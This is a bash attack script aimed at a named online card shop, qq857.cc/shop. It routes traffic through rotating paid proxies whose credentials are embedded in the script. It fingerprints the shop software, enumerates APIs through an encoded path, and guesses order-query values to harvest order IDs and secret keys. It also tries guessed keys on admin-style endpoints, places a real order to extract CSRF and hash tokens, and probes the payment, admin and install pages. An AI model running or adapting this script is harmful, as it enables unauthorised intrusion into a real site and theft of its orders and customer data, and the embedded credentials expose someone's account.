#!/bin/bash
# qq857.cc/shop — SUCCESS_CASES + P1/P2
set -u
PROXY_URL=""
KEY=C413ED6D; PW=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://qq857.cc/shop
ROOT=https://qq857.cc
OUT=/tmp/qq857_out; CK=/tmp/qq857.ck; LOG=/tmp/qq857_recon.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PW}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 8 --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }
cj(){ c -H 'X-Requested-With: XMLHttpRequest' "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo '===== DNS ====='
getent hosts qq857.cc || true

echo '===== fingerprint ====='
python3 - <<'PY'
import re
h=open('/tmp/qq857_out/home.html',encoding='utf-8',errors='ignore').read()
print('len',len(h))
print('title', (re.search(r'<title>([^<]+)',h) or type('x',(),{'group':lambda*a:None})()).group(1))
for pat in [r'assets/faka', r'YKFAKA', r'Get_Yk_KC', r'ajax\.php', r'csrf_token', r'USDT', r't\.me/[A-Za-z0-9_]+', r'@[A-Za-z0-9_]{4,}']:
    ms=re.findall(pat,h,re.I)
    if ms: print(pat,'=>',list(dict.fromkeys(ms))[:12])
PY

echo '===== getcount / api ====='
cj -X POST "$BASE/ajax.php?act=getcount" | tee "$OUT/getcount.json"; echo
for act in siteinfo classlist goodslist; do
  echo "--- $act ---"
  c "$BASE/%61pi.php?act=$act" | tee "$OUT/${act}.json" | head -c 400; echo
done
echo "api.php => $(c "$BASE/api.php?act=siteinfo" -w '|%{http_code}' | head -c 120)"

echo '===== SUCCESS qd93 ====='
for data in 1 2 0 00 01 12 88 99 2026 202608 138 150 188 857; do
  code=$(c "$BASE/?mod=query&data=$data" -o "$OUT/qd_$data.html" -w '%{http_code}')
  python3 - <<PY
import re
h=open('/tmp/qq857_out/qd_$data.html',encoding='utf-8',errors='ignore').read()
so=re.findall(r"showOrder\((\d+)\s*,\s*'([a-f0-9]{32})'\)", h)
fk=re.findall(r'mod=faka&id=(\d+)&skey=([a-f0-9]{32})', h)
print(f'data=$data HTTP=$code showOrder={len(so)} faka={len(fk)} empty={"没有查询" in h}')
if so: print(' SO',so[:5])
PY
done

echo '===== SUCCESS 79yj search ====='
for id in 1 10 100 500 1000 2000 5000; do
  echo "search $id => $(c "$BASE/%61pi.php?act=search&id=$id" | head -c 160)"
done
echo "api.php search => $(c "$BASE/api.php?act=search&id=1" -w '|%{http_code}' | head -c 100)"

echo '===== SUCCESS YKFAKA ====='
for u in "$ROOT/Get_Yk_KC.html?gid=1" "$ROOT/Query_Km/1" "$BASE/Get_Yk_KC.html?gid=1" "$BASE/Query_Km/1"; do
  echo "$u => $(curl -sk --max-time 12 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== oracles ====='
CSRF=$(python3 -c "import re;h=open('/tmp/qq857_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h);print(m.group(1) if m else '')")
echo CSRF=$CSRF
refresh
for k in '' x test 123456 qq857 admin; do
  echo "tools [$k] => $(c -G --data-urlencode act=tools --data-urlencode "key=$k" "$BASE/%61pi.php")"
done
echo "token => $(c -G --data-urlencode act=token --data-urlencode key=test "$BASE/%61pi.php")"
echo "clone => $(c -G --data-urlencode act=clone --data-urlencode key=test "$BASE/%61pi.php")"
echo "cron => $(curl -sk --max-time 15 -x "$PROXY_URL" -A "$UA" "$BASE/cron.php?key=test" | head -c 80)"
echo "card => $(cj -X POST --data "card=test&csrf_token=$CSRF" "$BASE/ajax.php?act=card_check")"
echo "gift => $(cj -X POST --data "csrf_token=$CSRF" "$BASE/ajax.php?act=gift_start")"

echo '===== goods / siteinfo ====='
python3 - <<'PY'
import json,re
raw=open('/tmp/qq857_out/siteinfo.json',encoding='utf-8',errors='ignore').read()
try: s=json.loads(raw)
except Exception as e:
  print('siteinfo parse',e); s={}
print('sitename',s.get('sitename'),'build',s.get('build'),'kfqq',s.get('kfqq'))
an=s.get('anounce') or ''
print('tg',re.findall(r't\.me/[A-Za-z0-9_]+|@[A-Za-z0-9_]{4,}',an)[:12])
print('Taddr',re.findall(r'T[1-9A-HJ-NP-Za-km-z]{33}',an)[:5])
rawg=open('/tmp/qq857_out/goodslist.json',encoding='utf-8',errors='ignore').read()
try: g=json.loads(rawg)
except Exception as e:
  print('goods parse',e); g={'data':[]}
data=g.get('data') or []
print('goods',len(data))
inst=[]
for x in data:
  try: st=int(x.get('stock') or 0)
  except: st=0
  if st>0: inst.append(x)
print('instock',len(inst))
cands=sorted(inst,key=lambda z:float(z.get('price') or 0))
for x in cands[:8]:
  print(x.get('tid'),x.get('price'),x.get('stock'),(x.get('name') or '')[:45])
open('/tmp/qq857_out/tid.txt','w').write(str(cands[0]['tid']) if cands else '')
open('/tmp/qq857_out/price.txt','w').write(str(cands[0].get('price') if cands else ''))
PY

TID=$(cat "$OUT/tid.txt" 2>/dev/null || true)
if [[ -z "${TID:-}" ]]; then echo 'NO STOCK'; echo DONE; exit 0; fi

echo "===== pay tid=$TID ====="
refresh
c "$BASE/" -o "$OUT/home2.html" >/dev/null
c "$BASE/?mod=buy&tid=$TID" -o "$OUT/buy.html" -w 'BUY:%{http_code}\n'
python3 - <<'PY'
import re
h=open('/tmp/qq857_out/buy.html',encoding='utf-8',errors='ignore').read()
csrf=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h)
m=re.search(r"var\s+hashsalt\s*=\s*(.+?);",h)
open('/tmp/qq857_out/csrf.txt','w').write(csrf.group(1) if csrf else '')
open('/tmp/qq857_out/hs.js','w').write('console.log('+m.group(1)+')' if m else 'console.log("")')
print('csrf',bool(csrf),'hs',bool(m),'len',len(h))
PY
HS=$(node "$OUT/hs.js" 2>/dev/null | tr -d '\r\n')
CSRF=$(cat "$OUT/csrf.txt")
INPUT=qq857$(date +%H%M%S)
PAY=$(cj -X POST -H "Referer: $BASE/?mod=buy&tid=$TID" \
  --data-urlencode "tid=$TID" --data-urlencode "inputvalue=$INPUT" --data-urlencode "num=1" \
  --data-urlencode "hashsalt=$HS" --data-urlencode "csrf_token=$CSRF" "$BASE/ajax.php?act=pay")
echo PAY=$PAY
echo "$PAY" > "$OUT/pay.json"
TN=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$PAY" 2>/dev/null || true)
echo TN=$TN INPUT=$INPUT
echo "$TN">"$OUT/tn.txt"; echo "$INPUT">"$OUT/input.txt"

echo '===== post-order ====='
echo "getshop => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/getshop.php?trade_no=$TN")"
echo "fake => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/getshop.php?trade_no=fake1234567890123")"
curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/submit.php?type=usdt&orderid=$TN" -o "$OUT/usdt.html"
python3 - <<'PY'
h=open('/tmp/qq857_out/usdt.html',encoding='utf-8',errors='ignore').read()
print('usdt_closed','已关闭' in h,'len',len(h))
PY
curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/qqpay.php?trade_no=$TN" -o "$OUT/qq.html"
python3 - <<'PY'
import re
h=open('/tmp/qq857_out/qq.html',encoding='utf-8',errors='ignore').read()
print('MCHID',re.findall(r'MCHID[^\s<]{0,40}',h)[:4])
PY
for typ in alipay wxpay; do
  curl -sk --max-time 15 -x "$PROXY_URL" -A "$UA" "$BASE/other/submit.php?type=$typ&orderid=$TN" -o "$OUT/sub_$typ.html"
  python3 - <<PY
h=open('/tmp/qq857_out/sub_$typ.html',encoding='utf-8',errors='ignore').read()
print('submit $typ closed', '已关闭' in h, 'len', len(h))
PY
done
for body in "qq=$TN&type=1&csrf_token=$CSRF" "qq=$INPUT&csrf_token=$CSRF"; do
  code=$(cj -X POST --data "$body" "$BASE/ajax.php?act=query" -w '%{http_code}' -o "$OUT/q.out")
  echo "ajax query HTTP$code $(head -c 160 $OUT/q.out)"
done
code=$(c "$BASE/?mod=query&data=$TN" -o "$OUT/qd_exact.html" -w '%{http_code}')
python3 - <<PY
import re
h=open('/tmp/qq857_out/qd_exact.html',encoding='utf-8',errors='ignore').read()
print('mod=query exact HTTP=$code SO',re.findall(r"showOrder\((\d+),\s*'([a-f0-9]{32})'\)",h),'empty','没有查询' in h)
PY

echo '===== login / paths ====='
c "$BASE/?mod=login" -o "$OUT/login.html" -w 'login:%{http_code}\n'
cj -X POST --data "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha" | tee "$OUT/captcha.json"; echo
for u in "$BASE/admin/" "$BASE/install/" "$BASE/toollogs.php"; do
  echo "$u => $(curl -sk --max-time 12 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== RECON DONE ====='
